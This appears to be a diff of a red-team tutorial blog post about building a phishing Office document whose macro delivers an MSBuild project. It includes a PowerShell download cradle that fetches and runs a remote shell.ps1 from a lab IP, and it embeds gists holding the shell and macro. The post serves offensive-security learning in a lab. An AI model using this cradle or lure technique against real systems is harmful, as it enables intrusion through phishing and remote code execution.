@@ -27,9 +27,13 @@ Within this we execute our PowerShell 3.0+ download cradle:
 
 `pipeline.Commands.AddScript("IEX (iwr 'http://10.10.10.10/shell.ps1')");`
 
-Good. But now we need a means of delivering the project file and executing MSBuild. The macro below will download the csproj file to disk.
+our shell.ps1:
 
 <script src="https://gist.github.com/egre55/c058744a4240af6515eb32b2d33fbed3.js"></script>
+
+Good. But now we need a means of delivering the project file and executing MSBuild. The macro below will download the csproj file to disk.
+
+<script src="https://gist.github.com/egre55/563159175f8d6c1d31d7f3af77357549.js"></script>
 
 In order to stand a chance of the macro being executed, we need to dress the document appropriately.
 
@@ -37,4 +41,4 @@ John Lambert (@JohnLaTwC) regularly shares interesting phishing lures and payloa
 
 Now that our "malicious" document has been created we can test this out in the lab.
 
-<script src="https://gist.github.com/egre55/563159175f8d6c1d31d7f3af77357549.js"></script>
+
